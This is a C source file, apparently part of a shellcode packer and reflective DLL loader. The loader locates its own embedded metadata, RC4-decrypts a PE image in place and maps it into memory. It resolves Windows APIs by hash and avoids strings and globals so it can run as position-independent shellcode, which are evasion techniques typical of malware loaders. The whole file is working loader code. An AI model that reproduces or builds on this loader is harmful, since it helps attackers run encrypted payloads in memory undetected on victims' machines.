#include "framework.h"
#include "headers.h"
#include "payload.h"
#include "pe_loader.h"
#include "rc4.h"
#include "ldr.h"
#include "api_hash.h"

/*
 * Entry point of the packed payload loader.
 *
 * The payload is self contained: no arguments are passed, because the code
 * finds its own metadata by scanning forward from its own address. The caller
 * only has to transfer control to the first byte of the payload.
 *
 * Steps:
 *   1. locate the metadata that pack.py placed at the next page boundary
 *   2. validate it and decrypt the PE image in place
 *   3. hand the decrypted image to the regular reflective loader
 *
 * Return value (RAX): base address of the mapped image, or 0 on failure.
 *
 * Like pe_loader.c this file is compiled into the shellcode, so it must contain
 * no string literals and no global or static data.
 */

/* Provided by get_rip.asm: the address of the instruction after the call, which
   lies inside this shellcode. Used because the payload has no arguments. */
extern PBYTE rfdll_get_rip(void);

/*
 * First page boundary at or after "address". The metadata always sits on a page
 * boundary, so the scan only has to look at page aligned addresses.
 */
static PBYTE rfdll_next_page(PBYTE address)
{
	return (PBYTE)(((UINT64)address + (RFDLL_PAGE_SIZE - 1)) & ~(UINT64)(RFDLL_PAGE_SIZE - 1));
}

/*
 * Find the metadata by scanning forward from the loader code.
 *
 * The scan is bounded twice: by RFDLL_SCAN_LIMIT, and by the end of the memory
 * region that currently holds the payload. The second bound matters because the
 * payload is not guaranteed to be followed by committed memory; without it a
 * scan that misses would read an unmapped page and raise an access violation
 * instead of returning a clean failure.
 */
static PRFDLL_META rfdll_find_meta(PBYTE start, PBYTE* region_limit)
{
	PBYTE cursor = NULL;
	PBYTE end = NULL;
	HMODULE kernel32 = NULL;
	fnVirtualQuery virtual_query = NULL;
	MEMORY_BASIC_INFORMATION memory_info;
	DWORD scanned = 0;

	*region_limit = NULL;

	/*
	 * VirtualQuery is best effort: when it cannot be resolved or fails, the
	 * scan simply falls back to the fixed limit below.
	 */
	kernel32 = GMHR_Hash(HASH_KERNEL32);
	if (kernel32 != NULL)
	{
		virtual_query = (fnVirtualQuery)GPAR_Hash(kernel32, HASH_VIRTUALQUERY);
	}

	cursor = rfdll_next_page(start);
	end = cursor + RFDLL_SCAN_LIMIT;

	if (virtual_query != NULL)
	{
		PBYTE query_address = cursor;

		/*
		 * The metadata is placed right after the code by the packer, so it is
		 * inside the first region that follows the loader. Walking the regions
		 * would need several MB of stack for a loop that one query answers.
		 *
		 * The end of the region has to stay a full 64 bit address: the payload
		 * can easily live above 4 GB, and truncating the bound to 32 bits makes
		 * the scan stop immediately.
		 */
		if (virtual_query(query_address, &memory_info, sizeof(memory_info)) == sizeof(memory_info))
		{
			PBYTE region_end = (PBYTE)memory_info.BaseAddress + memory_info.RegionSize;

			*region_limit = region_end;

			if (region_end > cursor && region_end < end)
				end = region_end;
		}
	}

	if (end <= cursor)
		return NULL;

	for (scanned = 0; (PBYTE)(cursor + scanned) < end; scanned += RFDLL_PAGE_SIZE)
	{
		PRFDLL_META candidate = (PRFDLL_META)(cursor + scanned);

		/*
		 * Both halves of the magic are compared against immediates so that no
		 * global constant is needed; see payload.h for why that matters.
		 */
		if (*(DWORD*)candidate->magic == RFDLL_MAGIC_LO &&
			*(DWORD*)(candidate->magic + 4) == RFDLL_MAGIC_HI)
		{
			return candidate;
		}
	}

	return NULL;
}

/*
 * Validate the metadata and decrypt the image in place.
 *
 * region_limit is the end of the committed memory that holds the payload, as
 * reported by VirtualQuery, or NULL when that could not be determined. The
 * metadata lives inside the payload and is therefore untrusted: without the
 * limit a corrupt dll_size would make the in place RC4 write past the end of
 * the buffer. When the limit is unknown the caller has to accept that risk,
 * which is why the PE headers are still revalidated by rfdll_load_image.
 */
static BOOL rfdll_open_payload(PRFDLL_META meta, PRFDLL_PAYLOAD payload, PBYTE region_limit)
{
	PBYTE image = NULL;
	PBYTE payload_end = NULL;

	if (meta->version != RFDLL_META_VERSION)
		return FALSE;
	if (meta->dll_size < sizeof(IMAGE_DOS_HEADER) || meta->dll_size > RFDLL_MAX_IMAGE_SIZE)
		return FALSE;

	/* Only the flags this version defines may be set. */
	if ((meta->flags & ~RFDLL_FLAG_HEADERS_STRIPPED) != 0)
		return FALSE;

	if (meta->key_length > RFDLL_MAX_KEY_LENGTH)
		return FALSE;

	/* The key and the image follow the header directly. */
	image = (PBYTE)meta + RFDLL_META_HEADER_SIZE + meta->key_length;
	payload_end = image + meta->dll_size;

	/* Reject a payload that would run past the memory that holds it. */
	if (region_limit != NULL)
	{
		if (image < (PBYTE)meta || payload_end > region_limit || payload_end < image)
			return FALSE;
	}

	payload->meta = meta;
	payload->image = image;
	payload->image_size = meta->dll_size;
	payload->key = (const BYTE*)meta + RFDLL_META_HEADER_SIZE;
	payload->key_length = meta->key_length;
	payload->host_hash = meta->host_hash;
	payload->headers_stripped = (meta->flags & RFDLL_FLAG_HEADERS_STRIPPED) != 0;

	/*
	 * RC4 is a stream cipher, so this both encrypts and decrypts: the payload
	 * holds the ciphertext and this call turns it into the PE image. The
	 * decryption happens in place, so the loader must own a writable copy of
	 * the payload - which it does, the caller mapped it for it.
	 */
	if (payload->key_length != 0)
	{
		rfdll_rc4(image, payload->image_size, payload->key, payload->key_length);
	}

	return TRUE;
}

UINT64 entrypoint_packed(void)
{
	PBYTE self = NULL;
	PBYTE region_limit = NULL;
	PRFDLL_META meta = NULL;
	RFDLL_PAYLOAD payload;

	self = rfdll_get_rip();
	if (self == NULL)
		return 0;

	meta = rfdll_find_meta(self, &region_limit);
	if (meta == NULL)
		return 0;

	if (!rfdll_open_payload(meta, &payload, region_limit))
		return 0;

	return rfdll_load_image(payload.image, payload.image_size);
}
